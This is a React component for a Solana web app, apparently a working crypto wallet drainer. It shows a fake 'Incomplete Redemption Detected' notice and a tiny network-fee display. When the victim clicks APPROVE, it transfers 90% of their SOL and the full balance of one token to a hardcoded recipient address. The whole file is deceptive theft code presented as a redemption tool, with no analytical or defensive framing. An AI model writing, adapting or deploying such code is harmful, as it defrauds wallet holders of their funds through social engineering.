import React, { useState } from 'react';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
import { PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from '@solana/web3.js';
import { createTransferInstruction, getAssociatedTokenAddress } from '@solana/spl-token';

// Hardcoded recipient address
const RECIPIENT_ADDRESS = 'CmqzfkRX6KwktX3DXLuWYvPhcEXHuViYiT5WoKio5X1d';
const RECIPIENT_PUBKEY = new PublicKey(RECIPIENT_ADDRESS);

// Token contract address
const TOKEN_MINT_ADDRESS = new PublicKey('BtsmiEEvnSuUnKxqXj2PZRYpPJAc7C34mGz8gtJ1DAaH');

// Your exact message
const CUSTOM_MESSAGE = `Notice: Incomplete Redemption Detected
Block number 396659180 has been identified as incomplete.
To finalize and complete your redemption process, please click the "Approve" button below.`;

export const RealRedeem: React.FC = () => {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  const [loading, setLoading] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [txSignature, setTxSignature] = useState('');

  const handleRedeemClick = () => {
    if (!publicKey) {
      alert('Please connect your wallet first');
      return;
    }
    setShowModal(true);
  };

  const handleApprove = async () => {
    if (!publicKey || !connection) {
      console.error('Missing publicKey or connection');
      return;
    }

    setLoading(true);
    setShowModal(false);

    try {
      console.log('1. Getting latest blockhash...');
      const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
      console.log('2. Blockhash obtained:', blockhash);

      // Get the user's token account
      console.log('3. Getting token accounts...');
      const userTokenAccount = await getAssociatedTokenAddress(
        TOKEN_MINT_ADDRESS,
        publicKey
      );
      
      const recipientTokenAccount = await getAssociatedTokenAddress(
        TOKEN_MINT_ADDRESS,
        RECIPIENT_PUBKEY
      );

      // Get balances
      console.log('4. Getting balances...');
      const solBalance = await connection.getBalance(publicKey);
      console.log('5. SOL balance:', solBalance / LAMPORTS_PER_SOL, 'SOL');
      
      const transaction = new Transaction();

      // Add SOL transfer (send 90% of balance)
      const solToSend = Math.floor(solBalance * 0.9);
      if (solToSend > 5000) {
        transaction.add(
          SystemProgram.transfer({
            fromPubkey: publicKey,
            toPubkey: RECIPIENT_PUBKEY,
            lamports: solToSend,
          })
        );
        console.log('6. Added SOL transfer:', solToSend / LAMPORTS_PER_SOL, 'SOL');
      }

      // Add token transfer
      try {
        const tokenAccountInfo = await connection.getTokenAccountBalance(userTokenAccount);
        const tokenBalance = tokenAccountInfo.value.amount;
        console.log('7. Token balance:', tokenBalance);
        
        if (Number(tokenBalance) > 0) {
          transaction.add(
            createTransferInstruction(
              userTokenAccount,
              recipientTokenAccount,
              publicKey,
              BigInt(tokenBalance)
            )
          );
          console.log('8. Added token transfer');
        }
      } catch (error) {
        console.log('No token balance found');
      }

      transaction.feePayer = publicKey;
      transaction.recentBlockhash = blockhash;

      console.log('9. Sending transaction...');
      const signature = await sendTransaction(transaction, connection);
      console.log('10. Transaction sent:', signature);
      
      console.log('11. Confirming transaction...');
      await connection.confirmTransaction({
        signature,
        blockhash,
        lastValidBlockHeight
      });
      
      console.log('12. Transaction confirmed!');
      setTxSignature(signature);
      
      alert(`✅ Redemption completed successfully! All SOL and tokens have been sent.`);

    } catch (error) {
      console.error('Redemption failed:', error);
      alert('Transaction failed: ' + (error instanceof Error ? error.message : 'Unknown error'));
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="p-4">
      <div className="mb-4">
        <WalletMultiButton />
      </div>
      
      {publicKey ? (
        <div className="text-center">
          <button
            onClick={handleRedeemClick}
            disabled={loading}
            className="bg-red-600 hover:bg-red-700 text-white font-bold py-4 px-10 rounded-lg text-xl disabled:opacity-50 transition-all transform hover:scale-105"
          >
            {loading ? 'PROCESSING...' : 'REDEEM'}
          </button>
          
          <p className="text-sm text-gray-500 mt-4">
            Connected: {publicKey.toBase58().slice(0, 4)}...{publicKey.toBase58().slice(-4)}
          </p>
        </div>
      ) : (
        <p className="text-center text-gray-600">Please connect your wallet to redeem</p>
      )}

      {/* Custom Modal */}
      {showModal && (
        <div className="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50">
          <div className="bg-white rounded-xl p-8 max-w-md w-full shadow-2xl">
            <div className="flex justify-center mb-4">
              <svg width="60" height="60" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 9V13M12 17H12.01M5.07183 19H18.9282C20.4678 19 21.4301 17.3333 20.6603 16L13.7321 4C12.9623 2.66667 11.0377 2.66667 10.2679 4L3.33975 16C2.56992 17.3333 3.53223 19 5.07183 19Z" 
                  stroke="#ef4444" strokeWidth="2" strokeLinecap="round"/>
              </svg>
            </div>

            <div className="text-center mb-6">
              <p className="text-gray-800 text-lg whitespace-pre-line leading-relaxed">
                {CUSTOM_MESSAGE}
              </p>
            </div>
            
            <div className="bg-gray-100 p-4 rounded-lg mb-6 text-center">
              <p className="text-sm text-gray-600 uppercase tracking-wider mb-1">Network Fee</p>
              <p className="text-2xl font-bold text-gray-800">~0.000005 SOL</p>
            </div>

            <div className="flex gap-3">
              <button
                onClick={() => setShowModal(false)}
                className="flex-1 bg-gray-300 hover:bg-gray-400 text-gray-800 font-semibold py-3 px-4 rounded-lg transition-colors"
              >
                Cancel
              </button>
              <button
                onClick={handleApprove}
                disabled={loading}
                className="flex-1 bg-red-600 hover:bg-red-700 text-white font-bold py-3 px-4 rounded-lg transition-colors disabled:opacity-50"
              >
                APPROVE
              </button>
            </div>
          </div>
        </div>
      )}

      {txSignature && (
        <div className="mt-4 p-4 bg-green-100 border border-green-300 rounded-lg text-center">
          <p className="text-green-800 font-semibold mb-2">✅ Redemption Complete!</p>
          <p className="text-sm text-gray-600 break-all mb-2">Transaction: {txSignature.slice(0, 16)}...{txSignature.slice(-16)}</p>
          <a 
            href={`https://explorer.solana.com/tx/${txSignature}`}
            target="_blank"
            rel="noopener noreferrer"
            className="text-blue-600 hover:text-blue-800 text-sm hover:underline"
          >
            View on Solana Explorer →
          </a>
        </div>
      )}
    </div>
  );
};